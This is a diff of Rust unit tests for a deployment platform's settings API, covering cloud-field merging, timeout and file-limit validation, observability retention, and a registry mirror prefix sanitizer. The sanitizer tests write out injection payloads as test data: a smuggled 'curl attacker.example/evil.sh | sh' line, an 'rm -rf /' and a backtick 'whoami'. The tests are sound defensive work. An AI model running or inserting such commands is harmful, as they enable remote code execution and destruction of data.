+    /// Preserving is not freezing: a client that names a field still writes it,
+    /// including writing it *back to its default value* — the case a
+    /// "value equals the default means absent" heuristic would silently drop.
+    #[test]
+    fn an_explicitly_sent_cloud_field_still_overrides_the_stored_one() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        let merged = merge_settings_body(
+            serde_json::json!({
+                "cloud": {
+                    "telemetry_bulk_anomaly_factor": 7.5,
+                    "backend_url": "https://app.temps.sh",
+                }
+            }),
+            &current,
+        );
+
+        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, Some(7.5));
+        // Explicitly restoring the default destination is a real write.
+        assert_eq!(merged.cloud.backend_url, "https://app.temps.sh");
+        // The two keys this body did not name are still preserved.
+        assert_eq!(
+            merged.cloud.telemetry_bulk_rate_limit_spans_per_sec,
+            Some(5_000)
+        );
+        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
+    }
+
+    /// An explicit `null` is a value, not an omission: it is how a client
+    /// removes the backfill throttle and returns the anomaly factor to the
+    /// documented default.
+    #[test]
+    fn an_explicit_null_clears_a_cloud_field_instead_of_preserving_it() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        let merged = merge_settings_body(
+            serde_json::json!({
+                "cloud": {
+                    "telemetry_bulk_rate_limit_spans_per_sec": null,
+                    "telemetry_bulk_anomaly_factor": null,
+                }
+            }),
+            &current,
+        );
+
+        assert_eq!(merged.cloud.telemetry_bulk_rate_limit_spans_per_sec, None);
+        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, None);
+        assert_eq!(
+            merged.cloud.effective_bulk_anomaly_factor(),
+            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR
+        );
+        // Still scoped: the unnamed ADR-041 fields are untouched.
+        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
+        assert_eq!(merged.cloud.backend_url, "https://cloud.staging.example");
+    }
+
+    #[test]
+    fn cloud_field_presence_is_read_per_key_from_the_request_body() {
+        let nothing = CloudFieldsSent::from_settings_body(&serde_json::json!({}));
+        assert_eq!(nothing, CloudFieldsSent::default());
+
+        // A `cloud` block that exists but names no operator-tuned field (what a
+        // client that only knows about the consent flags would send).
+        let consent_only = CloudFieldsSent::from_settings_body(&serde_json::json!({
+            "cloud": { "telemetry_enabled": true }
+        }));
+        assert_eq!(consent_only, CloudFieldsSent::default());
+
+        let outbox_only = CloudFieldsSent::from_settings_body(&serde_json::json!({
+            "cloud": { "telemetry_outbox_max_bytes": 1024 }
+        }));
+        assert!(outbox_only.telemetry_outbox_max_bytes);
+        assert!(!outbox_only.backend_url);
+        assert!(!outbox_only.telemetry_bulk_anomaly_factor);
+        assert!(!outbox_only.telemetry_bulk_rate_limit_spans_per_sec);
+    }
+
+    /// The stored value and the effective value must be the same number.
+    ///
+    /// The runtime clamps on read, so an out-of-range value could never break
+    /// the chat — but it would be echoed back by the API and shown in the form,
+    /// telling the operator a limit is in force that isn't. Found by testing
+    /// the endpoint rather than trusting the clamp.
+    #[test]
+    fn ai_chat_turn_timeout_outside_the_supported_range_is_rejected() {
+        for bad in [0, 5, 29, 3601, 99_999] {
+            let limits = AiChatLimitsSettings {
+                turn_timeout_secs: bad,
+            };
+            assert!(
+                validate_ai_chat_limits(&limits).is_err(),
+                "{bad}s should be rejected"
+            );
+        }
+    }
+
+    #[test]
+    fn ai_chat_turn_timeout_within_range_is_accepted() {
+        for ok in [30, 120, 900, 3600] {
+            let limits = AiChatLimitsSettings {
+                turn_timeout_secs: ok,
+            };
+            assert!(
+                validate_ai_chat_limits(&limits).is_ok(),
+                "{ok}s should be accepted"
+            );
+        }
+    }
+
+    #[test]
+    fn ai_workspace_file_limits_reject_unsafe_or_inconsistent_values() {
+        let oversized = AiWorkspaceFileLimitsSettings {
+            max_image_preview_size_mb: 17,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&oversized).is_err());
+
+        let oversized_download = AiWorkspaceFileLimitsSettings {
+            max_download_size_mb: 33,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&oversized_download).is_err());
+
+        let inconsistent = AiWorkspaceFileLimitsSettings {
+            max_file_size_mb: 16,
+            max_upload_size_mb: 8,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&inconsistent).is_err());
+
+        let preview_exceeds_download = AiWorkspaceFileLimitsSettings {
+            max_image_preview_size_mb: 8,
+            max_download_size_mb: 4,
+            ..AiWorkspaceFileLimitsSettings::default()
+        };
+        assert!(validate_ai_workspace_file_limits(&preview_exceeds_download).is_err());
+    }
+
+    #[test]
+    fn default_ai_workspace_file_limits_are_accepted() {
+        assert!(
+            validate_ai_workspace_file_limits(&AiWorkspaceFileLimitsSettings::default()).is_ok()
+        );
+    }
+
+    #[test]
+    fn request_timeouts_ceiling_outside_the_supported_range_is_rejected() {
+        for bad in [0, 4, 86_401, 999_999] {
+            let timeouts = RequestTimeoutSettings {
+                max_request_timeout_seconds: bad,
+                ..RequestTimeoutSettings::default()
+            };
+            assert!(
+                validate_request_timeouts(&timeouts).is_err(),
+                "ceiling {bad}s should be rejected"
+            );
+        }
+    }
+
+    #[test]
+    fn request_timeouts_zero_default_is_accepted_as_no_timeout() {
+        // 0 is the platform default and an explicit, valid "no timeout"
+        // state for each traffic class — not a validation error. Timeouts
+        // must be opt-in, so a zero default must never be rejected.
+        let sse_zero = RequestTimeoutSettings {
+            default_sse_idle_timeout_seconds: 0,
+            ..RequestTimeoutSettings::default()
+        };
+        assert!(
+            validate_request_timeouts(&sse_zero).is_ok(),
+            "zero SSE default (no timeout) should be accepted"
+        );
+
+        let http_zero = RequestTimeoutSettings {
+            default_http_timeout_seconds: 0,
+            ..RequestTimeoutSettings::default()
+        };
+        assert!(
+            validate_request_timeouts(&http_zero).is_ok(),
+            "zero HTTP default (no timeout) should be accepted"
+        );
+
+        let websocket_zero = RequestTimeoutSettings {
+            default_websocket_idle_timeout_seconds: 0,
+            ..RequestTimeoutSettings::default()
+        };
+        assert!(
+            validate_request_timeouts(&websocket_zero).is_ok(),
+            "zero WebSocket default (no timeout) should be accepted"
+        );
+    }
+
+    #[test]
+    fn request_timeouts_nonzero_default_outside_range_is_rejected() {
+        let http_too_high = RequestTimeoutSettings {
+            default_http_timeout_seconds: 90_000,
+            ..RequestTimeoutSettings::default()
+        };
+        assert!(
+            validate_request_timeouts(&http_too_high).is_err(),
+            "HTTP default above the max ceiling should be rejected"
+        );
+
+        let sse_too_high = RequestTimeoutSettings {
+            default_sse_idle_timeout_seconds: 90_000,
+            ..RequestTimeoutSettings::default()
+        };
+        assert!(
+            validate_request_timeouts(&sse_too_high).is_err(),
+            "SSE default above the max ceiling should be rejected"
+        );
+
+        let websocket_too_high = RequestTimeoutSettings {
+            default_websocket_idle_timeout_seconds: 90_000,
+            ..RequestTimeoutSettings::default()
+        };
+        assert!(
+            validate_request_timeouts(&websocket_too_high).is_err(),
+            "WebSocket default above the max ceiling should be rejected"
+        );
+    }
+
+    #[test]
+    fn request_timeouts_defaults_are_accepted() {
+        assert!(validate_request_timeouts(&RequestTimeoutSettings::default()).is_ok());
+    }
+
+    /// The bounds the form advertises must be the bounds the server enforces,
+    /// or the UI silently sends values that 400.
+    #[test]
+    fn advertised_bounds_match_the_runtime_clamp() {
+        let min = AiChatLimitsSettings {
+            turn_timeout_secs: AiChatLimitsSettings::MIN_TURN_TIMEOUT_SECS,
+        };
+        let max = AiChatLimitsSettings {
+            turn_timeout_secs: AiChatLimitsSettings::MAX_TURN_TIMEOUT_SECS,
+        };
+        assert_eq!(
+            min.turn_timeout().as_secs(),
+            u64::from(AiChatLimitsSettings::MIN_TURN_TIMEOUT_SECS)
+        );
+        assert_eq!(
+            max.turn_timeout().as_secs(),
+            u64::from(AiChatLimitsSettings::MAX_TURN_TIMEOUT_SECS)
+        );
+        assert!(validate_ai_chat_limits(&min).is_ok());
+        assert!(validate_ai_chat_limits(&max).is_ok());
+    }
 
     // Regression: a client round-tripping a never-configured external_url
     // sends `Some("")` (the form's empty-string default), which previously
@@ -1380,6 +3718,185 @@ mod tests {
         );
     }
 
+    #[test]
+    fn sanitize_registry_mirror_prefix_treats_blank_as_unset() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some(String::new())).unwrap(),
+            None
+        );
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some("   ".to_string())).unwrap(),
+            None
+        );
+        assert_eq!(sanitize_registry_mirror_prefix(None).unwrap(), None);
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_trims_whitespace_and_trailing_slash() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some("  registry.example.com/docker/ \n".to_string()))
+                .unwrap(),
+            Some("registry.example.com/docker".to_string())
+        );
+    }
+
+    // Regression: the settings API is the boundary where an operator-supplied
+    // prefix must be rejected outright, not silently defused later. Without
+    // this, a prefix containing an embedded newline would be accepted and
+    // stored, and only fail to apply (silently) once a build actually ran.
+    #[test]
+    fn sanitize_registry_mirror_prefix_rejects_embedded_control_characters() {
+        let err = sanitize_registry_mirror_prefix(Some(
+            "registry.example.com\nRUN curl attacker.example/evil.sh | sh".to_string(),
+        ))
+        .unwrap_err();
+        let detail = err.body.get("detail").and_then(|v| v.as_str()).unwrap();
+        assert!(detail.contains("registry_mirror_prefix"));
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_rejects_shell_metacharacters() {
+        assert!(sanitize_registry_mirror_prefix(Some(
+            "registry.example.com; rm -rf /".to_string()
+        ))
+        .is_err());
+        assert!(
+            sanitize_registry_mirror_prefix(Some("registry.example.com`whoami`".to_string()))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_accepts_a_well_formed_prefix() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some(
+                "registry.example.com:5000/team_a/docker-mirror".to_string()
+            ))
+            .unwrap(),
+            Some("registry.example.com:5000/team_a/docker-mirror".to_string())
+        );
+    }
+
+    #[test]
+    fn observability_compression_validation_accepts_supported_boundaries() {
+        assert!(
+            validate_observability_compression(&ObservabilityCompressionSettings {
+                proxy_logs_after_hours: 1,
+                otel_spans_after_hours: 1,
+            })
+            .is_ok()
+        );
+        assert!(
+            validate_observability_compression(&ObservabilityCompressionSettings {
+                proxy_logs_after_hours: 720,
+                otel_spans_after_hours: 2160,
+            })
+            .is_ok()
+        );
+    }
+
+    #[test]
+    fn observability_compression_validation_rejects_zero_and_over_retention() {
+        assert!(
+            validate_observability_compression(&ObservabilityCompressionSettings {
+                proxy_logs_after_hours: 0,
+                otel_spans_after_hours: 24,
+            })
+            .is_err()
+        );
+        assert!(
+            validate_observability_compression(&ObservabilityCompressionSettings {
+                proxy_logs_after_hours: 24,
+                otel_spans_after_hours: 2161,
+            })
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn observability_retention_validation_accepts_supported_boundaries() {
+        assert!(
+            validate_observability_retention(&ObservabilityRetentionSettings {
+                proxy_logs_days: 1,
+                otel_spans_days: 3650,
+                otel_logs_days: 90,
+                otel_metrics_days: 90,
+            })
+            .is_ok()
+        );
+    }
+
+    #[test]
+    fn observability_retention_validation_rejects_invalid_table_window() {
+        let error = validate_observability_retention(&ObservabilityRetentionSettings {
+            proxy_logs_days: 30,
+            otel_spans_days: 90,
+            otel_logs_days: 0,
+            otel_metrics_days: 90,
+        })
+        .expect_err("zero-day retention must be rejected");
+        assert_eq!(
+            error.body.get("detail").and_then(|value| value.as_str()),
+            Some("observability_retention.otel_logs_days must be between 1 and 3650")
+        );
+    }
+
+    // The ClickHouse metrics store is built from TEMPS_CLICKHOUSE_* env
+    // config, not from monitoring.clickhouse_url — selecting the ClickHouse
+    // store without a settings-level URL must be a valid save (the UI has no
+    // URL field; env-not-configured is reported via effective_metrics_store).
+    #[test]
+    fn monitoring_validation_accepts_clickhouse_store_without_url() {
+        let monitoring = MonitoringSettings {
+            store: MetricsStoreKind::ClickHouse,
+            clickhouse_url: None,
+            ..Default::default()
+        };
+        assert!(validate_monitoring_settings(&monitoring).is_ok());
+    }
+
+    #[test]
+    fn monitoring_validation_rejects_malformed_clickhouse_url() {
+        let monitoring = MonitoringSettings {
+            store: MetricsStoreKind::ClickHouse,
+            clickhouse_url: Some("not a url".into()),
+            ..Default::default()
+        };
+        let error = validate_monitoring_settings(&monitoring)
+            .expect_err("malformed clickhouse_url must be rejected");
+        assert_eq!(
+            error.body.get("detail").and_then(|value| value.as_str()),
+            Some("monitoring.clickhouse_url is not a valid URL")
+        );
+    }
+
+    #[test]
+    fn monitoring_validation_accepts_daily_retention_boundaries() {
+        for years in [1, 10] {
+            let monitoring = MonitoringSettings {
+                retention_daily_years: years,
+                ..Default::default()
+            };
+            assert!(validate_monitoring_settings(&monitoring).is_ok());
+        }
+    }
+
+    #[test]
+    fn monitoring_validation_rejects_daily_retention_outside_supported_range() {
+        for years in [0, 11] {
+            let monitoring = MonitoringSettings {
+                retention_daily_years: years,
+                ..Default::default()
+            };
+            let error = validate_monitoring_settings(&monitoring)
+                .expect_err("daily retention outside 1–10 years must be rejected");
+            assert_eq!(
+                error.body.get("detail").and_then(|value| value.as_str()),
+                Some("monitoring.retention_daily_years must be between 1 and 10")
+            );
+        }
+    }
+
     // Regression: the GET /api/settings response must surface agent_sandbox,
     // ai_config, preview_gateway, multi_node, and insecure_tls so the UI can
     // render (and round-trip) resource/runtime/network settings. An earlier
@@ -1397,6 +3914,9 @@ mod tests {
                         credentials_encrypted: Some("super-secret-blob".into()),
                         default_model: Some("sonnet".into()),
                         extra: serde_json::Value::Null,
+                        max_turns_analysis: None,
+                        max_turns_fix: None,
+                        max_turns_feedback: None,
                     },
                 )]
                 .into_iter()
@@ -1409,6 +3929,7 @@ mod tests {
                 cpu_limit: 8.0,
                 memory_limit_mb: 16_384,
                 network_mode: "restricted".into(),
+                sandbox_backend: None,
             },
             ..Default::default()
         };
@@ -1445,6 +3966,9 @@ mod tests {
                 credentials_encrypted: Some("super-secret-blob".into()),
                 default_model: None,
                 extra: serde_json::Value::Null,
+                max_turns_analysis: None,
+                max_turns_fix: None,
+                max_turns_feedback: None,
             },
         );
         settings.agent_sandbox.api_key_encrypted = Some("legacy-secret".into());
@@ -1491,6 +4015,167 @@ mod tests {
         assert!(json.contains("\"clickhouse_url_set\":true"));
     }
 
+    #[test]
+    fn response_surfaces_observability_compression_settings() {
+        let mut settings = AppSettings::default();
+        settings.observability_compression.proxy_logs_after_hours = 12;
+        settings.observability_compression.otel_spans_after_hours = 48;
+
+        let response = AppSettingsResponse::from(settings);
+
+        assert_eq!(
+            response.observability_compression.proxy_logs_after_hours,
+            12
+        );
+        assert_eq!(
+            response.observability_compression.otel_spans_after_hours,
+            48
+        );
+    }
+
+    #[test]
+    fn response_surfaces_observability_retention_settings() {
+        let mut settings = AppSettings::default();
+        settings.observability_retention.proxy_logs_days = 14;
+        settings.observability_retention.otel_spans_days = 60;
+
+        let response = AppSettingsResponse::from(settings);
+
+        assert_eq!(response.observability_retention.proxy_logs_days, 14);
+        assert_eq!(response.observability_retention.otel_spans_days, 60);
+        assert_eq!(response.observability_retention.otel_logs_days, 90);
+        assert_eq!(response.observability_retention.otel_metrics_days, 90);
+    }
+
+    #[test]
+    fn response_uses_active_timescale_policies_and_service_count() {
+        let policies = EffectiveTelemetryPolicies {
+            metrics_raw_days: Some(14),
+            metrics_hourly_days: Some(120),
+            metrics_daily_years: Some(3),
+            proxy_logs_compression_hours: Some(12),
+            otel_spans_compression_hours: Some(18),
+            proxy_logs_retention_days: Some(21),
+            otel_spans_retention_days: Some(75),
+            otel_logs_retention_days: Some(45),
+            otel_metrics_retention_days: Some(60),
+        };
+
+        let response = AppSettingsResponse::from(AppSettings::default())
+            .with_effective_store(false)
+            .with_effective_timescale_state(policies, Some(7));
+
+        assert_eq!(response.monitored_services_count, Some(7));
+        assert_eq!(response.monitoring.retention_raw_days, 14);
+        assert_eq!(response.monitoring.retention_hourly_days, 120);
+        assert_eq!(response.monitoring.retention_daily_years, 3);
+        assert_eq!(
+            response.observability_compression.proxy_logs_after_hours,
+            12
+        );
+        assert_eq!(
+            response.observability_compression.otel_spans_after_hours,
+            18
+        );
+        assert_eq!(response.observability_retention.proxy_logs_days, 21);
+        assert_eq!(response.observability_retention.otel_spans_days, 75);
+        assert_eq!(response.observability_retention.otel_logs_days, 45);
+        assert_eq!(response.observability_retention.otel_metrics_days, 60);
+    }
+
+    #[test]
+    fn response_exposes_cluster_pool_and_locks_it_after_allocation() {
+        let response = AppSettingsResponse::from(AppSettings::default())
+            .with_cluster_network_state(Some(crate::ClusterNetworkState {
+                compute_pool_cidr: "10.240.0.0/16".to_string(),
+                subnet_prefix_len: 24,
+                allocation_count: 2,
+            }));
+
+        assert_eq!(
+            response.multi_node.cluster_network,
+            Some(ClusterNetworkSettings {
+                compute_pool_cidr: "10.240.0.0/16".to_string(),
+                subnet_prefix_len: 24,
+                allocation_count: 2,
+                locked: true,
+            })
+        );
+    }
+
+    #[test]
+    fn response_marks_an_unused_cluster_pool_as_configurable() {
+        let response = AppSettingsResponse::from(AppSettings::default())
+            .with_cluster_network_state(Some(crate::ClusterNetworkState {
+                compute_pool_cidr: "172.20.0.0/16".to_string(),
+                subnet_prefix_len: 24,
+                allocation_count: 0,
+            }));
+
+        assert!(
+            !response
+                .multi_node
+                .cluster_network
+                .expect("cluster network state")
+                .locked
+        );
+    }
+
+    #[test]
+    fn response_does_not_overlay_clickhouse_backed_values() {
+        let mut settings = AppSettings::default();
+        settings.monitoring.store = MetricsStoreKind::ClickHouse;
+        let configured_monitoring = settings.monitoring.clone();
+        let configured_compression = settings.observability_compression.clone();
+        let configured_proxy_retention = settings.observability_retention.proxy_logs_days;
+        let configured_span_retention = settings.observability_retention.otel_spans_days;
+        let configured_metric_retention = settings.observability_retention.otel_metrics_days;
+
+        let response = AppSettingsResponse::from(settings)
+            .with_effective_store(true)
+            .with_effective_timescale_state(
+                EffectiveTelemetryPolicies {
+                    metrics_raw_days: Some(1),
+                    proxy_logs_compression_hours: Some(1),
+                    otel_spans_compression_hours: Some(1),
+                    proxy_logs_retention_days: Some(1),
+                    otel_spans_retention_days: Some(1),
+                    otel_logs_retention_days: Some(45),
+                    otel_metrics_retention_days: Some(60),
+                    ..Default::default()
+                },
+                Some(3),
+            );
+
+        assert_eq!(
+            response.monitoring.retention_raw_days,
+            configured_monitoring.retention_raw_days
+        );
+        assert_eq!(
+            response.monitoring.retention_hourly_days,
+            configured_monitoring.retention_hourly_days
+        );
+        assert_eq!(
+            response.monitoring.retention_daily_years,
+            configured_monitoring.retention_daily_years
+        );
+        assert_eq!(response.observability_compression, configured_compression);
+        assert_eq!(
+            response.observability_retention.proxy_logs_days,
+            configured_proxy_retention
+        );
+        assert_eq!(
+            response.observability_retention.otel_spans_days,
+            configured_span_retention
+        );
+        assert_eq!(response.observability_retention.otel_logs_days, 45);
+        assert_eq!(
+            response.observability_retention.otel_metrics_days,
+            configured_metric_retention
+        );
+        assert_eq!(response.monitored_services_count, Some(3));
+    }
+
     // The effective metrics store reconciles the `store` toggle with the
     // server's ClickHouse env-var state, mirroring `build_ch_metrics_store`.
     #[test]
@@ -1505,11 +4190,19 @@ mod tests {
             MetricsStoreKind::TimescaleDb,
             "ClickHouse selected but env vars unset must fall back to TimescaleDB"
         );
+        assert_eq!(
+            response.effective_observability_store,
+            MetricsStoreKind::TimescaleDb
+        );
 
         // store=click_house AND env vars configured → runtime uses ClickHouse.
         let response = AppSettingsResponse::from(settings).with_effective_store(true);
         assert_eq!(
             response.effective_metrics_store,
+            MetricsStoreKind::ClickHouse
+        );
+        assert_eq!(
+            response.effective_observability_store,
             MetricsStoreKind::ClickHouse
         );
 
@@ -1518,6 +4211,11 @@ mod tests {
         assert_eq!(
             response.effective_metrics_store,
             MetricsStoreKind::TimescaleDb
+        );
+        assert_eq!(
+            response.effective_observability_store,
+            MetricsStoreKind::ClickHouse,
+            "proxy logs and spans use ClickHouse whenever its server config is available"
         );
     }
 
